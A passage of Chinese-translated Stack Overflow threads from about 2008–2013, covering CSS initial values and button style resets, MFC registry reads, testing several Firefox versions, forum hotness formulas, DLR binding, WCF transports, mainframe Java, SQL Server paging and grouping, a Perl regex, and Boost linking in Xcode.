    background : 0;
    background-attachment : scroll;
    background-clip : border-box;
    background-color : transparent;
    background-image : none;
    background-origin : padding-box;
    background-position : 0 0;
    background-position-x : 0;
    background-position-y : 0;
    background-repeat : repeat;
    background-size : auto auto;
    border : 0;
    border-style : none;
    border-width : medium;
    border-color : inherit;
    border-bottom : 0;
    border-bottom-color : inherit;
    border-bottom-left-radius : 0;
    border-bottom-right-radius : 0;
    border-bottom-style : none;
    border-bottom-width : medium;
    border-collapse : separate;
    border-image : none;
    border-left : 0;
    border-left-color : inherit;
    border-left-style : none;
    border-left-width : medium;
    border-radius : 0;
    border-right : 0;
    border-right-color : inherit;
    border-right-style : none;
    border-right-width : medium;
    border-spacing : 0;
    border-top : 0;
    border-top-color : inherit;
    border-top-left-radius : 0;
    border-top-right-radius : 0;
    border-top-style : none;
    border-top-width : medium;
    bottom : auto;
    box-shadow : none;
    box-sizing : content-box;
    caption-side : top;
    clear : none;
    clip : auto;
    color : inherit;
    columns : auto;
    column-count : auto;
    column-fill : balance;
    column-gap : normal;
    column-rule : medium none currentColor;
    column-rule-color : currentColor;
    column-rule-style : none;
    column-rule-width : none;
    column-span : 1;
    column-width : auto;
    content : normal;
    counter-increment : none;
    counter-reset : none;
    cursor : auto;
    direction : ltr;
    display : inline;
    empty-cells : show;
    float : none;
    font : normal;
    font-family : inherit;
    font-size : medium;
    font-style : normal;
    font-variant : normal;
    font-weight : normal;
    height : auto;
    hyphens : none;
    left : auto;
    letter-spacing : normal;
    line-height : normal;
    list-style : none;
    list-style-image : none;
    list-style-position : outside;
    list-style-type : disc;
    margin : 0;
    margin-bottom : 0;
    margin-left : 0;
    margin-right : 0;
    margin-top : 0;
    max-height : none;
    max-width : none;
    min-height : 0;
    min-width : 0;
    opacity : 1;
    orphans : 0;
    outline : 0;
    outline-color : invert;
    outline-style : none;
    outline-width : medium;
    overflow : visible;
    overflow-x : visible;
    overflow-y : visible;
    padding : 0;
    padding-bottom : 0;
    padding-left : 0;
    padding-right : 0;
    padding-top : 0;
    page-break-after : auto;
    page-break-before : auto;
    page-break-inside : auto;
    perspective : none;
    perspective-origin : 50% 50%;
    position : static;
    /* May need to alter quotes for different locales (e.g fr) */
    quotes : '\201C' '\201D' '\2018' '\2019';
    right : auto;
    tab-size : 8;
    table-layout : auto;
    text-align : inherit;
    text-align-last : auto;
    text-decoration : none;
    text-decoration-color : inherit;
    text-decoration-line : none;
    text-decoration-style : solid;
    text-indent : 0;
    text-shadow : none;
    text-transform : none;
    top : auto;
    transform : none;
    transform-style : flat;
    transition : none;
    transition-delay : 0s;
    transition-duration : 0s;
    transition-property : none;
    transition-timing-function : ease;
    unicode-bidi : normal;
    vertical-align : baseline;
    visibility : visible;
    white-space : normal;
    widows : 0;
    width : auto;
    word-spacing : normal;
    z-index : auto;
}
```

参考链接 - [GitHub](https://github.com/peteboere/css-crush/blob/master/misc/initial-values.ini)

以上是您问题的解决方案，但我不认为 css reset 是可行的，除非我们最终遇到这种情况，所以尽量避免这种情况。

我希望这能帮到您。

谢谢

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-11-06T10:07:55.393

我所做的，它似乎适用于所有浏览器是......

```
$(buttonID).css({
'background-color':''
}); 
```

只需将背景颜色留空，它似乎就可以将按钮恢复为默认状态。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2013-11-13T01:09:14.853

[这](http://diythemes.com/thesis/rtfm/restore-browser-default-style-comment-submit-button/)似乎工作得很好（相信我，试试吧）：

```
/* Restore Browser's Default Submit Button Style */
input[type=submit] {
    background:ButtonFace; 
    color:ButtonText; 
    border:2px outset ButtonFace;
}
input[type=submit]:active {
    border-style:inset; 
    -webkit-appearance:push-button;
} 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2010-12-31T03:42:34.090

我想出了同样的问题。这篇文章对我帮助很大。我必须将该 CSS 规则分配给特殊表格中的文本输入，而不是分配给页面中的所有文本输入。所以我不得不使用带有表 id 的 CSS 规则。这应该适用于表单 ID。

'#addForum note' 是特殊格式表的 id。

```
 #addForumNote input[type="text"], label, textarea{
  width: 425px;
  background-color: #ccc;
  border-style: solid;
  border: 1px;
  border-color: #7a7b7a;
} 

```

希望这可以帮助某人。谢谢。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2011-04-15T20:27:05.447

我认为没有任何方法可以访问计算的样式。Javascript（据我所知）只能设置内联样式和分配类。我希望 DOM 样式对象可以访问计算的样式，但遗憾的是没有。

在这一点上我能想到的最好的事情就是简单地声明你自己的 css 规则来覆盖主机站点使用的任何内容。只要你的css规则更具体，它最终会赢。这将使您的书签在浏览器中具有一致的外观和感觉，这最终可能不是一件坏事。

# c++ - MFC SetRegistryKey... 有GetRegistryKey 函数吗？

> ID：381131
> 
> 赞同：1
> 
> 时间：2008-12-19T14:41:54.690
> 
> 标签：c++, mfc, registry

我有这两行代码。

```
CString strHost = AfxGetApp()->GetProfileString(_T("WebServices"), _T("Server"));
AfxMessageBox(strHost); 
```

我没有在应用程序的任何地方设置值。（安装程序会这样做）。因此，无论何时何地运行此行，strHost 都应该是相同的。

这就是我所拥有的。按 A -> 运行包含代码的函数 -> 查看预期数据；按 B -> 执行一些 Windows 回调 -> 运行包含代码的函数 -> 参见“”；

我认为B中的某些东西正在清除值，但是如果我先按B然后按A，A会产生我想要的东西而不是“”。

遗憾的是，我无法访问保存 Windows 回调的代码，或者更确切地说，它必须是我见过的最大的一堆管理不善的混淆。

我很好奇的是，如果 GetProfileString 正在从不应该的地方提取数据？这是我唯一能想到的。

问题。
1.) 有没有办法确认我仍在使用相同的“密钥”？
2.) 有没有人遇到过这种情况？

*如果您认为这是一个不好的问题，并希望将其标记为这样，请发表评论，以便我可以解决它。*

* * *

虽然我没有完全找到答案，但我确实找到了一些有趣的东西。
我正在使用 AfxGetApp()->GetProfileString..
似乎函数 AfxGetApp() 在不同的时间返回不同的东西.. 我不确定这是怎么发生的，但至少我现在可以解释它了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-19T14:54:35.337

除了注册表之外，GetProfileString() 还可以从 .ini 文件中读取。如果对 GetProfileString() 的调用是在与主应用程序中的对象不同的 CWinApp 派生对象上完成的（例如在 dll 中），它可能会尝试从应用程序的 .ini 文件中读取。尝试进入 GetProfileString() 以了解发生了什么。

但是我的建议是：不要使用 GetProfileString()。使用 CRegKey 直接查询注册表。这可能不是您想听到的，因为必须传递注册表项是很重要的。我通常做的是在stdafx.h 中#define 一个全局APPLICATION_REG_KEY 宏。它让纯粹主义者感到不安，但它非常方便。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-28T01:23:19.180

我找到了答案.. 有点。AfxGetApp 函数根据调用位置返回不同的对象。例如，如果在 dll 中调用它，它会返回指向该对象的指针。我认为当应用程序使用操作系统调用时它甚至会返回错误的东西。这意味着 GetProfileString 用于不同的“配置文件”。

我没有找到遇到此问题的人，但我认为问题已解决。如果您不这样做，请随意添加更多“答案”。

# firefox - 如何使用多个版本的 Firefox 进行测试？

> ID：381134
> 
> 赞同：2
> 
> 时间：2008-12-19T14:43:42.423
> 
> 标签：firefox, multiple-versions

如何在多个版本的 Firefox 中测试我的网站？我已经安装了 v2。现在无论我在哪里或安装多少次 FF3，它总是执行 ff2..

我检查了互联网，似乎曾经有一个可以运行多个版本的 MultiFireFox 工具。这是给苹果的，我在窗户上。此外，所有指向它的链接都已失效。
我还找到了一个可以添加到可执行文件中的选项。但由于我一开始就无法启动FF3，我认为这并没有多大意义。

像[MultipleIE](http://tredosoft.com/Multiple_IE)这样的东西会很棒。建议？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2008-12-19T14:49:17.953

试试[Firefox 便携](http://portableapps.com/news/2008-12-16_-_firefox_portable_3.0.5)版……每个版本一个文件夹。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2008-12-19T14:48:56.360

您需要做的是设置两个配置文件，一个用于 Firefox3，一个用于 Firefox 2。这是一个非常简单的过程；我让他们俩都跑了，我喜欢它！

[这是设置两个配置文件的一种方法](http://blog.codefront.net/2007/08/20/how-to-have-firefox-3-and-firefox-2-running-at-the-same-time/)

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-12-19T14:45:32.530

您可以尝试设置几个虚拟机，并在每个虚拟机上安装不同的浏览器版本。

前任：

*   VM1 - IE6、FF1
*   VM2 - IE7、FF2
*   VM3 - IE8B, FF3

等等

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-12-19T14:51:41.567

用于`-no-remote`避免只告诉正在运行的实例打开一个新窗口。

通常，您需要将其与`-P`运行具有不同配置文件的两个实例相结合。

只需检查[可用的命令行选项](https://developer.mozilla.org/en/Command_Line_Options)。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-21T20:33:34.213

[这篇 Mozillazine 文章](http://kb.mozillazine.org/Opening_a_new_instance_of_Firefox_with_another_profile)描述了运行两个单独的 Firefox 进程的一般情况。还有[这篇文章专门介绍了不同的版本](http://kb.mozillazine.org/Testing_pre-release_versions)。

为了让生活更轻松，我建议以 zip 格式下载每晚构建，而不是尝试运行安装程序（例如，[这是当前的 2.0 主干](http://ftp.mozilla.org/pub/mozilla.org/firefox/nightly/latest-mozilla1.8/)）。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-12-26T08:43:35.253

如果您只需要检查独立页面（即不是流程的一部分），您可以使用 Browsershots 在线测试您的页面 - [http://browsershots.org/](http://browsershots.org/)

Browsershots 是一项免费的开源在线服务，它采用 URL 并根据您的选择，在各种浏览器、每个浏览器的不同版本和不同操作系统上检查它。

# algorithm - 确定线程“热度”的算法

> ID：381138
> 
> 赞同：2
> 
> 时间：2008-12-19T14:45:30.270
> 
> 标签：algorithm, forum

我试图想出一种方法来确定论坛中某些线程的“热度”。你会使用什么标准，为什么？这些将如何结合在一起给出热度分数？

我正在考虑的标准包括：

*   有多少回复
*   距离上次回复多长时间
*   回复之间的平均时间

该算法必须解决的问题：

*   一个有 500 条回复的帖子显然很热门，除非最后一次回复是一年多以前。
*   一秒钟前回复了 500 条回复的帖子显然很热门，除非它需要 4 年才能达到 500 条回复。
*   最后4分钟有15条回复的帖子真的很火！

有什么想法、想法或完整的解决方案吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-19T14:51:10.787

Jeff Atwood 对此有[一个很好的问题](https://meta.stackexchange.com/questions/11602/what-formula-should-be-used-to-determine-hot-questions)，他提供了大量关于其他“热门”算法的信息。我建议使用其中一种并根据自己的喜好进行调整。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-19T14:49:11.603

最简单的算法：如果自 Y 以来有超过 X 个回复，则它是热的。

如果您更喜欢可扩展的内容，只需计算自 y 时间以来的回复次数。更多的回复意味着更多的热度。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-19T16:16:08.853

感谢那些发布指向其他问题/答案的链接的人。不幸的是，这些方程式比我的设置考虑的要多得多（例如：投票、作者的声誉等）

在玩弄它之后，我想出了这个等式，我将暂时使用它：

```
log10($numOfReplies * 20000 / pow($timeSinceLastPost, 1.3)) 
```

它仍然可以使用一些工作。例如，如果有一个非常流行但很老的帖子，它的热度会很低，但如果有人回复它，它就会在几天/几周内回到顶部。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-19T16:33:02.143

为什么不只使用一种指数衰减模型。所有帖子的线程热度=总和（k^（自发布以来的时间））。这具有非常容易更新和计算的优点。您必须使用 k 和您的时间测量单位（k 应该 < 1，但相当接近）

当前热度 = 上次发帖时的热度 * k^（自上次发帖以来的时间）。
新帖后热度 = 当前热度 + 1

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2010-04-16T05:44:40.897

您应该注意的一件事是人们是否可能想要“玩弄”算法以使/保持他们的线程“热”。实际上，您几乎可以假设他们会这样做。

阻止这种情况的最低限度是只考虑来自不同人的回复。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-12-19T14:48:58.357

我在想你可以在这里用递减的波来模拟它，使用幅度（或均方根）来测量热度。随着时间的流逝，浪潮逐渐减弱，因此迟到的回复只会引起一点轰动。

在实践中，我认为这需要大量的计算。您可以充分利用缓存来加快计算速度。

只是我的两分钱。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-12-19T14:50:35.577

简而言之，我发现“热度”的对数衰减是最自然的。

# .net - MetaObject 构造函数中限制参数的用途？

> ID：381141
> 
> 赞同：0
> 
> 时间：2008-12-19T14:46:44.400
> 
> 标签：.net, dynamic-language-runtime

我目前在我的 DLR 语言实现中遇到一个问题，在该语言中定义的方法的后续调用使用与该方法的第一次调用相同的输入参数发生。

所以......如果我用我的语言这样做：

```
PrintType( 34 );
PrintType( 34.1 ); 
```

...输出是：

*整数*

*整数*

我期望的地方：

*整数*

*十进制*

我怀疑（但还不能确认）问题是由以下原因引起的：

1.  我的调用绑定器（InvokeAction 子类）生成一个适当的调用表达式，然后返回一个带有该表达式和 Restrictions.Empty 的新 MetaObject

2.  因此，我认为可能发生的情况是 Restrictions 参数通知 DLR 何时可以将此构造重新用于对该方法的后续调用，并且由于我没有设置固有限制，因此始终重新使用第一个构造（抱歉，我这里的术语可能是错误的......希望你明白）

所以......我在想我需要使用为每个参数生成的限制的合并......按类型，或者按实例。

有人可以证实或否认我的想法吗？对于我所看到的行为，我应该探索任何其他可能性吗？

蒂亚...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-19T17:37:58.190

你的想法是正确的。在这种情况下，您将需要类型限制 - 通常您希望限制尽可能少，以便可以从尽可能多的呼叫站点共享代码。

这样做的方式是，在向您的活页夹询问规则之前，DLR 正在搜索缓存的规则。这些限制会阻止缓存规则适用于一组新的输入。

# wcf - 如何为 WCF 编写基于套接字的自定义传输

> ID：381142
> 
> 赞同：9
> 
> 时间：2008-12-19T14:47:19.360
> 
> 标签：wcf, sockets

我有一个移动平台，我正在尝试在上面编写一些通信代码。

该平台提供基于标准套接字功能的专有通信机制。基本上，平台的套接字 API 看起来与标准的 Windows 套接字 API 完全相同，只是每个函数都有一个前缀。

我想使用 WCF 将 Sockets API 的复杂性从我的消费应用程序中抽象出来，但是很难找到能够充分描述所有需要编码的部分的资源。

任何人都可以推荐一个好的起点，或者描述为 WCF 编写基于套接字的自定义传输所需的内容吗？理想情况下，我希望能够通过这种传输机制使用 HttpBinding。

谢谢！

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2008-12-19T20:58:50.997

我整理了一些[资源](http://winterdom.com/weblog/2007/02/14/WritingAWCFTransportChannelPart1.aspx)列表，用于编写可能有用的 WCF 传输通道。不幸的是，并非所有链接都仍然有效，但大多数链接仍然有效，并且其中有一些有用的东西。

我还[简要介绍](http://winterdom.com/weblog/2007/02/19/WritingAWCFTransportChannelPart2.aspx)了一些部分如何组合在一起，这可能会有所帮助。

我不太明白你的问题：你提到你想在你的传输之上运行 HttpBinding。你的意思是你想在自定义的类套接字 API 之上使用 WCF http 传输通道，而不是常规的 Windows 套接字 API？

如果是这样，那么不，由于各种原因，这将不起作用。其中之一是绑定和通道并没有真正直接绑定在一起，而是绑定定义（即其中包含哪些绑定元素）控制如何在运行时为您的服务/客户端创建通道堆栈。

因此，基本上，在编写自定义传输通道时，您将创建自己的自定义 TransportBindingElement 派生类，您可以在自定义绑定中使用该类以使用您自己的传输通道而不是默认传输通道之一（如 HttpTransport）。但是，请注意，传输通道无论如何都是通道堆栈的底部（即它下面没有任何东西），因此无论如何您都不能将 HttpTransport 放在自定义传输之上（即使 API 限制不存在） .

换句话说，如果您想使用 HTTP，您需要将 HTTP 内容烘焙到您的自定义通道实现中。但是，只要您公开正确的通道形状，没有什么可以阻止您在自己的通道之上使用其余的默认基本/ws http 绑定。

# java - 有人用 Java 做大型机或 AS/400 批处理吗？

> ID：381144
> 
> 赞同：1
> 
> 时间：2008-12-19T14:47:54.880
> 
> 标签：java, batch-file, ibm-midrange, mainframe

我将向客户建议我用 Java 构建一些批处理作业，这些作业将在他们的大型机和/或 AS/400 上运行（对不起 System z 和 System i）。这两个平台都是最新的系统软件。我想知道是否有人这样做并且可以提供任何需要注意的指针或陷阱。

其动机是访问 Java 可用的工具和库，以执行诸如调用 Web 服务和创建 PDF 之类的事情。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-19T15:23:14.857

两台机器都很好地支持 Java。

在 z/OS 上，整个 Webshere 应用程序服务器套件以及相关的流程服务器和 ESB 都已被移植。

主要动机是从“现代”应用程序直接访问遗留 DB2（以及在较小程度上是 IMS）数据库。

我也看到过用于 CICS 的 Java，但它非常有问题（JVM 不断地重新初始化）。

我编写了一些 JNI 代码来在 websphere 上公开本机汇编器应用程序 API。

我不确定 iSeries 的情况，但我知道的大多数 iSeries 商店仍然坚持使用 RPG IV。

主要问题是 UTF-16 与 EBCDIC 之间的转换。它们需要时间，而且您确实需要注意 LOCALE 设置（如果您的 USS shell、DB2 数据库设置为相同的代码页，则最简单）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2011-01-11T04:42:52.147

这个问题已经得到解答，但是 Java 很好地移植到了 IBM i (OS/400)——我在 1998 年使用它——它们甚至是一个[暴露了大部分 i 平台的 Java API](http://www-03.ibm.com/systems/i/software/toolbox/overview.html)。如*z*和*i*所述，完全支持完整的 WebSphere 堆栈。

# sql-server - 如何在 SQL SERVER 中选择大量记录

> ID：381145
> 
> 赞同：2
> 
> 时间：2008-12-19T14:48:24.803
> 
> 标签：sql-server, records

我试图在具有数百万条记录的表中选择 SQL Server 中超过 80,000 条记录。问题是我有正确的索引，但返回记录集需要超过 15 分钟。

我使用的是 MS SQL Server 2000，我发现了一种使用存储过程的分页方法，但它使用了一个临时表，我必须插入整个结果集，然后选择每页要显示的记录数量。这种方法耗时太长。

对我可以实施的更快方法有什么帮助吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-12-19T15:40:28.770

您必须对其进行编辑以实现用户过滤和排序选项的输入参数，但一般原则将适用。我在 2000/2001 时间范围内将这种技术与 SQL 2000 一起使用，并使用 90M 记录表来提供 150- 的快速分页200k 行结果集。由于只有key在temp表中，是一个很窄很小的temp表；e，而且性能很快，（这一步只需要读取主表索引，而不是表本身）然后，当实际（较小）返回结果集（仅@PageSize行）从主表生成数据时，查询只需要读取很少的记录......

```
Create Procedure GetPagedData
@Page Integer = 1,
@PageSize Integer = 100,
@UsersFilteringCOnditions,
@UsersSortOptions
As
Set NoCount On

Declare @Start Integer,
Declare @End Integer
Declare @NumRecs Integer

   -- Declare a temp table variable to hold all the pk values...
   Declare @Keys Table (rowNum integer Identity Primary Key NotNull,
                        keyVal Integer Not Null)

   -- Insert all the Primary Keys into the temp table variable...
   Insert @keys(keyVal)
   Select PrimaryKey From MyMillionRowTable
   Where UsersFilterConditionsAreTrue
   Order By UsersSortOptions

  -- Then, select from your big table only the data 
  -- from the rows for the page the user wants

   Select @NumRecs = Count(*) From Keys 
   Set @End = @Page * @PageSize
   Set @Start = @End + 1 - @PageSize

   Select {Insert ColumnListHere}
   From MyMillionRowTable T
       Join @Keys K On K.KeyVal = T.PrimaryKey 
   Where K.rowNum Between @Start And @End 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-19T14:52:02.253

有几个选项。通常的数据库调优技巧（我不是专家）。是否可以在后台将您关心的子集数据提取到较小的表中？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-19T14:56:34.880

它肯定使用索引吗？是聚集索引吗？检查执行计划。您可能还想重建索引。

如果做不到这一点，请发布查询以及表定义和索引。

它也可能是您的 SQL 配置（正在使用的 RAM 量等）或您的硬件的限制。它是单个磁盘还是 RAID？如果 RAID 有一个驱动器发生故障导致后台重建？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-19T16:30:00.433

*@jmpena：抱歉，执行计划需要 2% 的书签读取和 98% 的索引扫描*

我想你在这里回答了你自己的问题。“98% 扫描索引”。扫描索引仅意味着 SQL 找到了一个索引，该索引*可能*有助于根据统计信息选择性能。根据索引，操作可能与表扫描本身一样糟糕。

如果正确调整索引/查询，您应该看到的是索引搜索。

你能分享一下桌子上有什么索引吗？(sp_help {tablename})

# sql - 链接匹配组

> ID：381153
> 
> 赞同：1
> 
> 时间：2008-12-19T14:50:25.860
> 
> 标签：sql, sql-server, tsql

我有一个表，它表示来自另一个表的 id 之间的一系列匹配，如下所示：

```
CREATE TABLE #matches (
  asid1 int,
  asid2 int
)

insert into #matches values (1,2)
insert into #matches values (1,3)
insert into #matches values (3,1)
insert into #matches values (3,4)
insert into #matches values (7,6)
insert into #matches values (5,7)
insert into #matches values (8,1)
insert into #matches values (1,8)
insert into #matches values (8,9)
insert into #matches values (8,3)
insert into #matches values (10,11)
insert into #matches values (12,10) 
```

我想找到直接或间接相互关联的匹配组。

输出将如下所示：

```
group  asid
1      1
1      2
1      3
1      4
1      8
1      9
2      5
2      6
2      7
3      10
3      11
3      12 
```

如果我要添加另一行：

```
insert into #matches values (7,8) 
```

那么这意味着上面的两个组将被链接，所以我需要输出：

```
group  asid
1      1
1      2
1      3
1      4
1      5
1      6
1      7
1      8
1      9
2      10
2      11
2      12 
```

有任何想法吗？

编辑：进一步的研究使我相信递归公用表表达式应​​该可以解决问题......如果我想出一些优雅的东西，我会发布它

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-19T15:19:20.777

看来你需要一个[不相交集来解决这个问题。](http://en.wikipedia.org/wiki/Disjoint-set_data_structure)这是 C# 和 C++ 实现的[列表](http://www.emilstefanov.net/Programming/DisjointSets.aspx)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-19T15:21:00.320

如果这可以在 SQL 中完成，那将是非常困难的。您应该使用您使用的任何编程语言来分析该表。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-23T03:14:18.990

如果您使用的是 Oracle，CONNECT TO 命令非常棒。Tom Kyte 对此有一篇很好的文章，回答了似乎本质上与您相同的问题：

[http://www.oracle.com/technology/oramag/oracle/05-may/o35asktom.html](http://www.oracle.com/technology/oramag/oracle/05-may/o35asktom.html)

查看“层次结构扩展”部分。

# regex - 请解释这个 Perl 正则表达式

> ID：381157
> 
> 赞同：1
> 
> 时间：2008-12-19T14:51:14.033
> 
> 标签：regex, perl, string

```
 $rowfetch =~ s/['-]//g; #All chars inside the [ ] will be filtered out.
    $rowfetch =~ m/(\w+), ?(.)/;
    printf $fh lc($2.$1); 
```

昨天我得到了构建这个正则表达式的帮助，但我并不完全理解它。

它采用了类似 Parisi、Kenneth 的名称并打印出 kparisi

Knowns：
s/ = 替代
m/ = 匹配

我尝试搜索其余名称，但找不到任何真正有助于解释它的内容。

我也不明白 =~ 应该如何评估为真或假，但在这种情况下，它正在修改字符串。

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2008-12-19T14:57:32.880

我发现该`YAPE::Regex::Explain`模块非常有帮助 -

```
C:\>perl -e "use YAPE::Regex::Explain;print YAPE::Regex::Explain->new(qr/['-])->explain;"
The regular expression:

(?-imsx:['-])

matches as follows:

NODE                     EXPLANATION
----------------------------------------------------------------------
(?-imsx:                 group, but do not capture (case-sensitive)
                         (with ^ and $ matching normally) (with . not
                         matching \n) (matching whitespace and #
                         normally):
----------------------------------------------------------------------
  ['-]                     any character of: ''', '-'
----------------------------------------------------------------------
)                        end of grouping
----------------------------------------------------------------------

C:\>perl -e "use YAPE::Regex::Explain; print YAPE::Regex::Explain->new(qr/(\w+), ?(.)/)->explain;"
The regular expression:

(?-imsx:(\w+), ?(.))

matches as follows:

NODE                     EXPLANATION
----------------------------------------------------------------------
(?-imsx:                 group, but do not capture (case-sensitive)
                         (with ^ and $ matching normally) (with . not
                         matching \n) (matching whitespace and #
                         normally):
----------------------------------------------------------------------
  (                        group and capture to \1:
----------------------------------------------------------------------
    \w+                      word characters (a-z, A-Z, 0-9, _) (1 or
                             more times (matching the most amount
                             possible))
----------------------------------------------------------------------
  )                        end of \1
----------------------------------------------------------------------
  ,                        ','
----------------------------------------------------------------------
   ?                       ' ' (optional (matching the most amount
                           possible))
----------------------------------------------------------------------
  (                        group and capture to \2:
----------------------------------------------------------------------
    .                        any character except \n
----------------------------------------------------------------------
  )                        end of \2
----------------------------------------------------------------------
)                        end of grouping
----------------------------------------------------------------------

C:\> 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2008-12-19T14:59:31.067

我只是在这种情况下将其中一张[备忘单](http://www.addedbytes.com/cheat-sheets/regular-expressions-cheat-sheet/)固定在我的立方体墙上。谷歌`regular expression cheat sheet`寻找其他人。

添加到您已经知道的内容：

```
 g -- search globally throughout the string
  + -- match at least one, but as many as possible
  ? -- match 0 or 1
  . -- match any character
 () -- group these together
  , -- a plain comma, no special meaning
 [] -- match any character inside the brackets
 \w -- match any word character 
```

神奇之处在于分组——匹配表达式使用分组并将它们放入变量 $1 和 $2 中。在这种情况下，$1 匹配逗号前的单词，$2 匹配逗号后空格后面的第一个字符。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-12-22T01:17:15.343

下载“正则表达式教练”并进行探索。考虑购买“掌握正则表达式”，因为它会带你走过这个雷区。它是我见过的最好的排版书籍之一，内容丰富但深入人心。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-12-19T14:58:18.543

第一行： [] (' 和 -) 中的字符被匹配并替换为空 (s)，因此被删除。/g 表示全局并将尝试匹配字符串中的所有内容。

第二行：\w 表示一个单词字符，+ 表示不止一次。? 表示 0 或一次。“。” 意味着任何东西。所以它的意思是找到不止一次找到的任何单词字符，后跟一个逗号，后跟一个空格零或一次，然后是任何字符之一。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-12-19T15:00:31.253

```
$lhs =~ s/foo/bar/g; 
```

运算符是 Perl 中的`s/`修改正则表达式 - 您将 LHS 与右侧的第一部分 ( `foo`) 匹配。第二部分指定第一部分 ( `bar`) 中匹配项的替换。所以“ `Lafooey`”转到“ `Labarey`”。

在您的问题中，目的是删除所有 ' 和 - 就像在“O'Hanlon”和“Chalmonly-Witherington-Smyth”中一样。

然后它匹配“姓氏，名字的第一个字符”。括号将这些匹配项的值放入变量`$1`和`$2`中。

并打印“F”+“Lastname”的小写字母，因为这些是`$2`and中的值`$1`。

最后，您可以根据电话簿样式列表中的人的真实姓名为系统提供一个可行的用户名。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-12-19T15:00:38.880

iirc =~ 表示等于匹配（cf "~" 如果匹配则单独返回 true）

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-12-19T15:02:02.980

将`=~`左侧的表达式（字符串）与右侧的正则表达式匹配，它不会修改字符串。作为副作用，将变量`$1`, `$2`, ... 设置为匹配的括号部分。

在您的情况下，第一个括号将匹配“ `(\w+)`”（单词字符重复一次或多次，第二个将匹配“ `(.)`”（给定名称的第一个字母。“ ` ?`”表达式将匹配可选空格。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2009-01-16T21:49:48.937

请注意，如果输入的格式不正确，给定的代码将失败。这是我要做的：

```
$rowfetch =~ s/[ '-]//g; #All chars inside the [ ] will be filtered out.
if($rowfetch =~ m/(\w+),([a-z])/i) {
    printf $fh lc($2.$1);
} 
```

$1-$9 位置变量保存最后一次成功的匹配，但在匹配失败的情况下它们不会被重置。这意味着如果正则表达式不匹配，$1 和 $2 将不会被删除，你最终会得到与你想要的不同的东西。

我也稍微改变了正则表达式。第一行还删除了空格。由于您似乎正在创建用户名或电子邮件地址，因此您不需要空格。第二行更加严格，以确保 $2 是一个字母，而不是其他字符。最后的 'i' 告诉 perl 使所有字母匹配不区分大小写。有了它，我就不必制作第二部分 ([a-zA-Z])。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2010-04-13T17:23:38.620

YAPE::Regex::Explain 有一个很棒的 Web 前端。

这里是[s/['-]//g的解释](http://rick.measham.id.au/paste/explain.pl?regex=s%2F%5B%27-%5D%2F%2Fg)

对于[m/(\w+), ?(.)/](http://rick.measham.id.au/paste/explain.pl?regex=m%2F%28%5Cw%2B%29%2C+%3F%28.%29%2F)

# c++ - XCode 项目是否需要特殊设置才能使用预编译的 boost 库？

> ID：381161
> 
> 赞同：3
> 
> 时间：2008-12-19T14:53:29.160
> 
> 标签：c++, xcode, macos, boost

我刚刚在我的 Intel Mac 上第一次安装了 boost，只要我只使用 boost 的头文件，它就可以正常工作。

但是当我尝试使用一个库时，在我的情况下是正则表达式库，我的应用程序链接并启动正常，但很快它就会在一个正则表达式相关的析构函数中崩溃。

[这甚至发生在boost.org 的 unix 安装页面](http://www.boost.org/doc/libs/1_37_0/more/getting_started/unix-variants.html#link-your-program-to-a-boost-library)上给出的简单测试程序中。

我想知道除了设置搜索路径和包括正则表达式库之外，我是否需要设置特殊的编译/链接选项（我使用了 C++ 工具的默认值）？

（顺便说一句，我已经验证我系统上的默认编译器确实是 gcc 4.01，这与我在 XCode 中使用的测试项目相同）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-20T11:32:52.870

对自己的回答：

虽然尚不清楚导致此问题的原因，但有一种解决方法：

不要使用 boost 安装程序构建的库，而是将库的源代码（在 boost-main-folder/libs/ *libname* /src/ 中）添加到您的 Xcode 项目中，让 Xcode 为您编译源代码。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-06-20T15:16:11.533

我知道这个线程很旧，但现在即使使用 Boost 1.53，这仍然会发生。我在稍后的另一个线程中得到了回答——交叉链接，以防有人通过谷歌或其他搜索找到这个。

[使用 C++11 选项重新编译可以解决问题。显然，这不是clang的默认设置。](https://stackoverflow.com/questions/12695625/boost-test-crashes-on-exit-with-clang-4-1-llvm-3-1svn?answertab=active#tab-top)

# c++ - 朋友和内联方法，有什么意义？

> ID：381164
> 
> 赞同：27
> 
